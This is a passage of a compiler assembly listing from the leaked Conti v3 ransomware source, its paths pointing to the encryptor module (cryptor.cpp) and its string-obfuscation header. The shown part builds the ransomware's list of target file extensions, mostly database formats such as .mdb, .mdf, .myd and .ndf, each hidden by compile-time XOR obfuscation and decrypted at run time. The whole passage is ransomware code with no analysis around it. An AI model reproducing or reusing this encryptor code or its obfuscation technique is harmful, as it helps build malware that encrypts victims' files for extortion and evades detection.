  021f0	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$01$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<2,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  021f5	48 89 85 d0 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+416], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  021fc	c6 85 40 03 00
	00 00		 mov	 BYTE PTR $T86[rbp-256], 0
  02203	c6 85 41 03 00
	00 39		 mov	 BYTE PTR $T86[rbp-255], 57 ; 00000039H
  0220a	c6 85 42 03 00
	00 78		 mov	 BYTE PTR $T86[rbp-254], 120 ; 00000078H
  02211	c6 85 43 03 00
	00 6a		 mov	 BYTE PTR $T86[rbp-253], 106 ; 0000006aH
  02218	c6 85 44 03 00
	00 78		 mov	 BYTE PTR $T86[rbp-252], 120 ; 00000078H
  0221f	c6 85 45 03 00
	00 0c		 mov	 BYTE PTR $T86[rbp-251], 12
  02226	c6 85 46 03 00
	00 78		 mov	 BYTE PTR $T86[rbp-250], 120 ; 00000078H
  0222d	c6 85 47 03 00
	00 5f		 mov	 BYTE PTR $T86[rbp-249], 95 ; 0000005fH
  02234	c6 85 48 03 00
	00 78		 mov	 BYTE PTR $T86[rbp-248], 120 ; 00000078H
  0223b	c6 85 49 03 00
	00 78		 mov	 BYTE PTR $T86[rbp-247], 120 ; 00000078H
  02242	c6 85 4a 03 00
	00 78		 mov	 BYTE PTR $T86[rbp-246], 120 ; 00000078H

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  02249	0f b6 85 41 03
	00 00		 movzx	 eax, BYTE PTR $T86[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 379  : 		OBFW(L".maq"),

  02250	48 8d 8d 40 03
	00 00		 lea	 rcx, QWORD PTR $T86[rbp-256]
  02257	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BN@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<29,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0225c	48 89 85 d8 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+424], rax

; 380  : 		OBFW(L".mar"),

  02263	48 8d 8d 50 03
	00 00		 lea	 rcx, QWORD PTR $T87[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0226a	c6 85 50 03 00
	00 00		 mov	 BYTE PTR $T87[rbp-256], 0
  02271	c6 85 51 03 00
	00 07		 mov	 BYTE PTR $T87[rbp-255], 7
  02278	c6 85 52 03 00
	00 57		 mov	 BYTE PTR $T87[rbp-254], 87 ; 00000057H
  0227f	c6 85 53 03 00
	00 29		 mov	 BYTE PTR $T87[rbp-253], 41 ; 00000029H
  02286	c6 85 54 03 00
	00 57		 mov	 BYTE PTR $T87[rbp-252], 87 ; 00000057H
  0228d	c6 85 55 03 00
	00 5f		 mov	 BYTE PTR $T87[rbp-251], 95 ; 0000005fH
  02294	c6 85 56 03 00
	00 57		 mov	 BYTE PTR $T87[rbp-250], 87 ; 00000057H
  0229b	c6 85 57 03 00
	00 52		 mov	 BYTE PTR $T87[rbp-249], 82 ; 00000052H
  022a2	c6 85 58 03 00
	00 57		 mov	 BYTE PTR $T87[rbp-248], 87 ; 00000057H
  022a9	c6 85 59 03 00
	00 57		 mov	 BYTE PTR $T87[rbp-247], 87 ; 00000057H
  022b0	c6 85 5a 03 00
	00 57		 mov	 BYTE PTR $T87[rbp-246], 87 ; 00000057H
  022b7	0f b6 85 51 03
	00 00		 movzx	 eax, BYTE PTR $T87[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 380  : 		OBFW(L".mar"),

  022be	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DL@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<59,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  022c3	48 89 85 e0 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+432], rax

; 381  : 		OBFW(L".mas"),

  022ca	48 8d 8d 60 03
	00 00		 lea	 rcx, QWORD PTR $T88[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  022d1	c6 85 60 03 00
	00 00		 mov	 BYTE PTR $T88[rbp-256], 0
  022d8	c6 85 61 03 00
	00 6b		 mov	 BYTE PTR $T88[rbp-255], 107 ; 0000006bH
  022df	c6 85 62 03 00
	00 52		 mov	 BYTE PTR $T88[rbp-254], 82 ; 00000052H
  022e6	c6 85 63 03 00
	00 11		 mov	 BYTE PTR $T88[rbp-253], 17
  022ed	c6 85 64 03 00
	00 52		 mov	 BYTE PTR $T88[rbp-252], 82 ; 00000052H
  022f4	c6 85 65 03 00
	00 10		 mov	 BYTE PTR $T88[rbp-251], 16
  022fb	c6 85 66 03 00
	00 52		 mov	 BYTE PTR $T88[rbp-250], 82 ; 00000052H
  02302	c6 85 67 03 00
	00 51		 mov	 BYTE PTR $T88[rbp-249], 81 ; 00000051H
  02309	c6 85 68 03 00
	00 52		 mov	 BYTE PTR $T88[rbp-248], 82 ; 00000052H
  02310	c6 85 69 03 00
	00 52		 mov	 BYTE PTR $T88[rbp-247], 82 ; 00000052H
  02317	c6 85 6a 03 00
	00 52		 mov	 BYTE PTR $T88[rbp-246], 82 ; 00000052H
  0231e	0f b6 85 61 03
	00 00		 movzx	 eax, BYTE PTR $T88[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 381  : 		OBFW(L".mas"),

  02325	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DF@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<53,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0232a	48 89 85 e8 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+440], rax

; 382  : 		OBFW(L".mav"),

  02331	48 8d 8d 70 03
	00 00		 lea	 rcx, QWORD PTR $T89[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02338	c6 85 70 03 00
	00 00		 mov	 BYTE PTR $T89[rbp-256], 0
  0233f	c6 85 71 03 00
	00 02		 mov	 BYTE PTR $T89[rbp-255], 2
  02346	c6 85 72 03 00
	00 15		 mov	 BYTE PTR $T89[rbp-254], 21
  0234d	c6 85 73 03 00
	00 2d		 mov	 BYTE PTR $T89[rbp-253], 45 ; 0000002dH
  02354	c6 85 74 03 00
	00 15		 mov	 BYTE PTR $T89[rbp-252], 21
  0235b	c6 85 75 03 00
	00 3d		 mov	 BYTE PTR $T89[rbp-251], 61 ; 0000003dH
  02362	c6 85 76 03 00
	00 15		 mov	 BYTE PTR $T89[rbp-250], 21
  02369	c6 85 77 03 00
	00 21		 mov	 BYTE PTR $T89[rbp-249], 33 ; 00000021H
  02370	c6 85 78 03 00
	00 15		 mov	 BYTE PTR $T89[rbp-248], 21
  02377	c6 85 79 03 00
	00 15		 mov	 BYTE PTR $T89[rbp-247], 21
  0237e	c6 85 7a 03 00
	00 15		 mov	 BYTE PTR $T89[rbp-246], 21
  02385	0f b6 85 71 03
	00 00		 movzx	 eax, BYTE PTR $T89[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 382  : 		OBFW(L".mav"),

  0238c	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CJ@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<41,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02391	48 89 85 f0 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+448], rax

; 383  : 		OBFW(L".mdb"),

  02398	48 8d 8d 80 03
	00 00		 lea	 rcx, QWORD PTR $T90[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0239f	c6 85 80 03 00
	00 00		 mov	 BYTE PTR $T90[rbp-256], 0
  023a6	c6 85 81 03 00
	00 53		 mov	 BYTE PTR $T90[rbp-255], 83 ; 00000053H
  023ad	c6 85 82 03 00
	00 48		 mov	 BYTE PTR $T90[rbp-254], 72 ; 00000048H
  023b4	c6 85 83 03 00
	00 12		 mov	 BYTE PTR $T90[rbp-253], 18
  023bb	c6 85 84 03 00
	00 48		 mov	 BYTE PTR $T90[rbp-252], 72 ; 00000048H
  023c2	c6 85 85 03 00
	00 76		 mov	 BYTE PTR $T90[rbp-251], 118 ; 00000076H
  023c9	c6 85 86 03 00
	00 48		 mov	 BYTE PTR $T90[rbp-250], 72 ; 00000048H
  023d0	c6 85 87 03 00
	00 70		 mov	 BYTE PTR $T90[rbp-249], 112 ; 00000070H
  023d7	c6 85 88 03 00
	00 48		 mov	 BYTE PTR $T90[rbp-248], 72 ; 00000048H
  023de	c6 85 89 03 00
	00 48		 mov	 BYTE PTR $T90[rbp-247], 72 ; 00000048H
  023e5	c6 85 8a 03 00
	00 48		 mov	 BYTE PTR $T90[rbp-246], 72 ; 00000048H
  023ec	0f b6 85 81 03
	00 00		 movzx	 eax, BYTE PTR $T90[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 383  : 		OBFW(L".mdb"),

  023f3	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$02$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<3,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  023f8	48 89 85 f8 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+456], rax

; 384  : 		OBFW(L".mdf"),

  023ff	48 8d 8d 90 03
	00 00		 lea	 rcx, QWORD PTR $T91[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02406	c6 85 90 03 00
	00 00		 mov	 BYTE PTR $T91[rbp-256], 0
  0240d	c6 85 91 03 00
	00 3b		 mov	 BYTE PTR $T91[rbp-255], 59 ; 0000003bH
  02414	c6 85 92 03 00
	00 19		 mov	 BYTE PTR $T91[rbp-254], 25
  0241b	c6 85 93 03 00
	00 59		 mov	 BYTE PTR $T91[rbp-253], 89 ; 00000059H
  02422	c6 85 94 03 00
	00 19		 mov	 BYTE PTR $T91[rbp-252], 25
  02429	c6 85 95 03 00
	00 79		 mov	 BYTE PTR $T91[rbp-251], 121 ; 00000079H
  02430	c6 85 96 03 00
	00 19		 mov	 BYTE PTR $T91[rbp-250], 25
  02437	c6 85 97 03 00
	00 01		 mov	 BYTE PTR $T91[rbp-249], 1
  0243e	c6 85 98 03 00
	00 19		 mov	 BYTE PTR $T91[rbp-248], 25
  02445	c6 85 99 03 00
	00 19		 mov	 BYTE PTR $T91[rbp-247], 25
  0244c	c6 85 9a 03 00
	00 19		 mov	 BYTE PTR $T91[rbp-246], 25
  02453	0f b6 85 91 03
	00 00		 movzx	 eax, BYTE PTR $T91[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 384  : 		OBFW(L".mdf"),

  0245a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<67,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0245f	48 89 85 00 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+464], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02466	c6 85 a0 03 00
	00 00		 mov	 BYTE PTR $T92[rbp-256], 0
  0246d	c6 85 a1 03 00
	00 11		 mov	 BYTE PTR $T92[rbp-255], 17

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  02474	c6 85 a2 03 00
	00 30		 mov	 BYTE PTR $T92[rbp-254], 48 ; 00000030H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 385  : 		OBFW(L".mpd"),

  0247b	48 8d 8d a0 03
	00 00		 lea	 rcx, QWORD PTR $T92[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  02482	c6 85 a3 03 00
	00 1b		 mov	 BYTE PTR $T92[rbp-253], 27
  02489	c6 85 a4 03 00
	00 30		 mov	 BYTE PTR $T92[rbp-252], 48 ; 00000030H
  02490	c6 85 a5 03 00
	00 5e		 mov	 BYTE PTR $T92[rbp-251], 94 ; 0000005eH
  02497	c6 85 a6 03 00
	00 30		 mov	 BYTE PTR $T92[rbp-250], 48 ; 00000030H
  0249e	c6 85 a7 03 00
	00 50		 mov	 BYTE PTR $T92[rbp-249], 80 ; 00000050H
  024a5	c6 85 a8 03 00
	00 30		 mov	 BYTE PTR $T92[rbp-248], 48 ; 00000030H
  024ac	c6 85 a9 03 00
	00 30		 mov	 BYTE PTR $T92[rbp-247], 48 ; 00000030H
  024b3	c6 85 aa 03 00
	00 30		 mov	 BYTE PTR $T92[rbp-246], 48 ; 00000030H
  024ba	0f b6 85 a1 03
	00 00		 movzx	 eax, BYTE PTR $T92[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 385  : 		OBFW(L".mpd"),

  024c1	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GL@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<107,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  024c6	48 89 85 08 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+472], rax

; 386  : 		OBFW(L".mrg"),

  024cd	48 8d 8d b0 03
	00 00		 lea	 rcx, QWORD PTR $T93[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  024d4	c6 85 b0 03 00
	00 00		 mov	 BYTE PTR $T93[rbp-256], 0
  024db	c6 85 b1 03 00
	00 37		 mov	 BYTE PTR $T93[rbp-255], 55 ; 00000037H
  024e2	c6 85 b2 03 00
	00 39		 mov	 BYTE PTR $T93[rbp-254], 57 ; 00000039H
  024e9	c6 85 b3 03 00
	00 71		 mov	 BYTE PTR $T93[rbp-253], 113 ; 00000071H
  024f0	c6 85 b4 03 00
	00 39		 mov	 BYTE PTR $T93[rbp-252], 57 ; 00000039H
  024f7	c6 85 b5 03 00
	00 29		 mov	 BYTE PTR $T93[rbp-251], 41 ; 00000029H
  024fe	c6 85 b6 03 00
	00 39		 mov	 BYTE PTR $T93[rbp-250], 57 ; 00000039H
  02505	c6 85 b7 03 00
	00 2f		 mov	 BYTE PTR $T93[rbp-249], 47 ; 0000002fH
  0250c	c6 85 b8 03 00
	00 39		 mov	 BYTE PTR $T93[rbp-248], 57 ; 00000039H
  02513	c6 85 b9 03 00
	00 39		 mov	 BYTE PTR $T93[rbp-247], 57 ; 00000039H
  0251a	c6 85 ba 03 00
	00 39		 mov	 BYTE PTR $T93[rbp-246], 57 ; 00000039H
  02521	0f b6 85 b1 03
	00 00		 movzx	 eax, BYTE PTR $T93[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 386  : 		OBFW(L".mrg"),

  02528	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0L@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<11,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0252d	48 89 85 10 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+480], rax

; 387  : 		OBFW(L".mud"),

  02534	48 8d 8d c0 03
	00 00		 lea	 rcx, QWORD PTR $T94[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0253b	c6 85 c0 03 00
	00 00		 mov	 BYTE PTR $T94[rbp-256], 0
  02542	c6 85 c1 03 00
	00 23		 mov	 BYTE PTR $T94[rbp-255], 35 ; 00000023H
  02549	c6 85 c2 03 00
	00 5e		 mov	 BYTE PTR $T94[rbp-254], 94 ; 0000005eH
  02550	c6 85 c3 03 00
	00 5f		 mov	 BYTE PTR $T94[rbp-253], 95 ; 0000005fH
  02557	c6 85 c4 03 00
	00 5e		 mov	 BYTE PTR $T94[rbp-252], 94 ; 0000005eH
  0255e	c6 85 c5 03 00
	00 18		 mov	 BYTE PTR $T94[rbp-251], 24
  02565	c6 85 c6 03 00
	00 5e		 mov	 BYTE PTR $T94[rbp-250], 94 ; 0000005eH
  0256c	c6 85 c7 03 00
	00 20		 mov	 BYTE PTR $T94[rbp-249], 32 ; 00000020H
  02573	c6 85 c8 03 00
	00 5e		 mov	 BYTE PTR $T94[rbp-248], 94 ; 0000005eH
  0257a	c6 85 c9 03 00
	00 5e		 mov	 BYTE PTR $T94[rbp-247], 94 ; 0000005eH
  02581	c6 85 ca 03 00
	00 5e		 mov	 BYTE PTR $T94[rbp-246], 94 ; 0000005eH
  02588	0f b6 85 c1 03
	00 00		 movzx	 eax, BYTE PTR $T94[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 387  : 		OBFW(L".mud"),

  0258f	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$06$0FO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<7,94,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02594	48 89 85 18 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+488], rax

; 388  : 		OBFW(L".mwb"),

  0259b	48 8d 8d d0 03
	00 00		 lea	 rcx, QWORD PTR $T95[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  025a2	c6 85 d0 03 00
	00 00		 mov	 BYTE PTR $T95[rbp-256], 0
  025a9	c6 85 d1 03 00
	00 28		 mov	 BYTE PTR $T95[rbp-255], 40 ; 00000028H
  025b0	c6 85 d2 03 00
	00 4b		 mov	 BYTE PTR $T95[rbp-254], 75 ; 0000004bH
  025b7	c6 85 d3 03 00
	00 27		 mov	 BYTE PTR $T95[rbp-253], 39 ; 00000027H
  025be	c6 85 d4 03 00
	00 4b		 mov	 BYTE PTR $T95[rbp-252], 75 ; 0000004bH
  025c5	c6 85 d5 03 00
	00 3b		 mov	 BYTE PTR $T95[rbp-251], 59 ; 0000003bH
  025cc	c6 85 d6 03 00
	00 4b		 mov	 BYTE PTR $T95[rbp-250], 75 ; 0000004bH
  025d3	c6 85 d7 03 00
	00 11		 mov	 BYTE PTR $T95[rbp-249], 17
  025da	c6 85 d8 03 00
	00 4b		 mov	 BYTE PTR $T95[rbp-248], 75 ; 0000004bH
  025e1	c6 85 d9 03 00
	00 4b		 mov	 BYTE PTR $T95[rbp-247], 75 ; 0000004bH
  025e8	c6 85 da 03 00
	00 4b		 mov	 BYTE PTR $T95[rbp-246], 75 ; 0000004bH
  025ef	0f b6 85 d1 03
	00 00		 movzx	 eax, BYTE PTR $T95[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 388  : 		OBFW(L".mwb"),

  025f6	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$01$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<2,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  025fb	48 89 85 20 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+496], rax

; 389  : 		OBFW(L".myd"),

  02602	48 8d 8d e0 03
	00 00		 lea	 rcx, QWORD PTR $T96[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02609	c6 85 e0 03 00
	00 00		 mov	 BYTE PTR $T96[rbp-256], 0
  02610	c6 85 e1 03 00
	00 06		 mov	 BYTE PTR $T96[rbp-255], 6
  02617	c6 85 e2 03 00
	00 2a		 mov	 BYTE PTR $T96[rbp-254], 42 ; 0000002aH
  0261e	c6 85 e3 03 00
	00 22		 mov	 BYTE PTR $T96[rbp-253], 34 ; 00000022H
  02625	c6 85 e4 03 00
	00 2a		 mov	 BYTE PTR $T96[rbp-252], 42 ; 0000002aH
  0262c	c6 85 e5 03 00
	00 7c		 mov	 BYTE PTR $T96[rbp-251], 124 ; 0000007cH
  02633	c6 85 e6 03 00
	00 2a		 mov	 BYTE PTR $T96[rbp-250], 42 ; 0000002aH
  0263a	c6 85 e7 03 00
	00 1e		 mov	 BYTE PTR $T96[rbp-249], 30
  02641	c6 85 e8 03 00
	00 2a		 mov	 BYTE PTR $T96[rbp-248], 42 ; 0000002aH
  02648	c6 85 e9 03 00
	00 2a		 mov	 BYTE PTR $T96[rbp-247], 42 ; 0000002aH
  0264f	c6 85 ea 03 00
	00 2a		 mov	 BYTE PTR $T96[rbp-246], 42 ; 0000002aH
  02656	0f b6 85 e1 03
	00 00		 movzx	 eax, BYTE PTR $T96[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 389  : 		OBFW(L".myd"),

  0265d	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EH@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<71,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02662	48 89 85 28 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+504], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02669	c6 85 f0 03 00
	00 00		 mov	 BYTE PTR $T97[rbp-256], 0
  02670	c6 85 f1 03 00
	00 39		 mov	 BYTE PTR $T97[rbp-255], 57 ; 00000039H
  02677	c6 85 f2 03 00
	00 25		 mov	 BYTE PTR $T97[rbp-254], 37 ; 00000025H
  0267e	c6 85 f3 03 00
	00 02		 mov	 BYTE PTR $T97[rbp-253], 2
  02685	c6 85 f4 03 00
	00 25		 mov	 BYTE PTR $T97[rbp-252], 37 ; 00000025H
  0268c	c6 85 f5 03 00
	00 56		 mov	 BYTE PTR $T97[rbp-251], 86 ; 00000056H
  02693	c6 85 f6 03 00
	00 25		 mov	 BYTE PTR $T97[rbp-250], 37 ; 00000025H
  0269a	c6 85 f7 03 00
	00 78		 mov	 BYTE PTR $T97[rbp-249], 120 ; 00000078H

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  026a1	c6 85 f8 03 00
	00 25		 mov	 BYTE PTR $T97[rbp-248], 37 ; 00000025H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 390  : 		OBFW(L".ndf"),

  026a8	48 8d 8d f0 03
	00 00		 lea	 rcx, QWORD PTR $T97[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  026af	c6 85 f9 03 00
	00 25		 mov	 BYTE PTR $T97[rbp-247], 37 ; 00000025H
  026b6	c6 85 fa 03 00
	00 25		 mov	 BYTE PTR $T97[rbp-246], 37 ; 00000025H
  026bd	0f b6 85 f1 03
	00 00		 movzx	 eax, BYTE PTR $T97[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 390  : 		OBFW(L".ndf"),

  026c4	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<17,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  026c9	48 89 85 30 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+512], rax

; 391  : 		OBFW(L".nnt"),

  026d0	48 8d 8d 00 04
	00 00		 lea	 rcx, QWORD PTR $T98[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  026d7	c6 85 00 04 00
	00 00		 mov	 BYTE PTR $T98[rbp-256], 0
  026de	c6 85 01 04 00
	00 00		 mov	 BYTE PTR $T98[rbp-255], 0
  026e5	c6 85 02 04 00
	00 66		 mov	 BYTE PTR $T98[rbp-254], 102 ; 00000066H
  026ec	c6 85 03 04 00
	00 5a		 mov	 BYTE PTR $T98[rbp-253], 90 ; 0000005aH
  026f3	c6 85 04 04 00
	00 66		 mov	 BYTE PTR $T98[rbp-252], 102 ; 00000066H
  026fa	c6 85 05 04 00
	00 5a		 mov	 BYTE PTR $T98[rbp-251], 90 ; 0000005aH
  02701	c6 85 06 04 00
	00 66		 mov	 BYTE PTR $T98[rbp-250], 102 ; 00000066H
  02708	c6 85 07 04 00
	00 1b		 mov	 BYTE PTR $T98[rbp-249], 27
  0270f	c6 85 08 04 00
	00 66		 mov	 BYTE PTR $T98[rbp-248], 102 ; 00000066H
  02716	c6 85 09 04 00
	00 66		 mov	 BYTE PTR $T98[rbp-247], 102 ; 00000066H
  0271d	c6 85 0a 04 00
	00 66		 mov	 BYTE PTR $T98[rbp-246], 102 ; 00000066H
  02724	0f b6 85 01 04
	00 00		 movzx	 eax, BYTE PTR $T98[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 391  : 		OBFW(L".nnt"),

  0272b	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DF@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<53,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02730	48 89 85 38 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+520], rax

; 392  : 		OBFW(L".nrmlib"),

  02737	48 8d 8d 68 09
	00 00		 lea	 rcx, QWORD PTR $T99[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0273e	c6 85 68 09 00
	00 00		 mov	 BYTE PTR $T99[rbp-256], 0
  02745	c6 85 69 09 00
	00 23		 mov	 BYTE PTR $T99[rbp-255], 35 ; 00000023H
  0274c	c6 85 6a 09 00
	00 1b		 mov	 BYTE PTR $T99[rbp-254], 27
  02753	c6 85 6b 09 00
	00 0d		 mov	 BYTE PTR $T99[rbp-253], 13
  0275a	c6 85 6c 09 00
	00 1b		 mov	 BYTE PTR $T99[rbp-252], 27
  02761	c6 85 6d 09 00
	00 5b		 mov	 BYTE PTR $T99[rbp-251], 91 ; 0000005bH
  02768	c6 85 6e 09 00
	00 1b		 mov	 BYTE PTR $T99[rbp-250], 27
  0276f	c6 85 6f 09 00
	00 39		 mov	 BYTE PTR $T99[rbp-249], 57 ; 00000039H
  02776	c6 85 70 09 00
	00 1b		 mov	 BYTE PTR $T99[rbp-248], 27
  0277d	c6 85 71 09 00
	00 65		 mov	 BYTE PTR $T99[rbp-247], 101 ; 00000065H
  02784	c6 85 72 09 00
	00 1b		 mov	 BYTE PTR $T99[rbp-246], 27
  0278b	c6 85 73 09 00
	00 6a		 mov	 BYTE PTR $T99[rbp-245], 106 ; 0000006aH
  02792	c6 85 74 09 00
	00 1b		 mov	 BYTE PTR $T99[rbp-244], 27
  02799	c6 85 75 09 00
	00 21		 mov	 BYTE PTR $T99[rbp-243], 33 ; 00000021H
  027a0	c6 85 76 09 00
	00 1b		 mov	 BYTE PTR $T99[rbp-242], 27
  027a7	c6 85 77 09 00
	00 1b		 mov	 BYTE PTR $T99[rbp-241], 27
  027ae	c6 85 78 09 00
	00 1b		 mov	 BYTE PTR $T99[rbp-240], 27
  027b5	0f b6 85 69 09
	00 00		 movzx	 eax, BYTE PTR $T99[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 392  : 		OBFW(L".nrmlib"),

